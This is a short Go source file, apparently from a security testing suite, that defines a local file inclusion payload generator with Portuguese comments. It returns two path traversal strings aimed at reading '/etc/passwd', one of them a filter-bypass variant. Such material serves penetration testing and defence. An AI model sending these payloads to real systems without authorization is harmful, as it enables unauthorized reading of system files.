
package payloads

import (
	"github.com/GhostN3xus/Huntsuite/pkg/modules"
)

// LFIPayloadGenerator gera payloads LFI.
type LFIPayloadGenerator struct{}

// NewLFIPayloadGenerator cria um novo gerador de payload LFI.
func NewLFIPayloadGenerator() *LFIPayloadGenerator {
	return &LFIPayloadGenerator{}
}

// Name retorna o nome do gerador de payload.
func (g *LFIPayloadGenerator) Name() string {
	return "lfi_basic"
}

// Generate gera uma lista de payloads LFI.
func (g *LFIPayloadGenerator) Generate(ctx *modules.TargetContext) ([]modules.Payload, error) {
	payloads := []modules.Payload{
		{Value: "../../../etc/passwd", Type: "LFI", Encoding: "URL"},
		{Value: "....//....//....//etc/passwd", Type: "LFI", Encoding: "URL"},
	}
	return payloads, nil
}
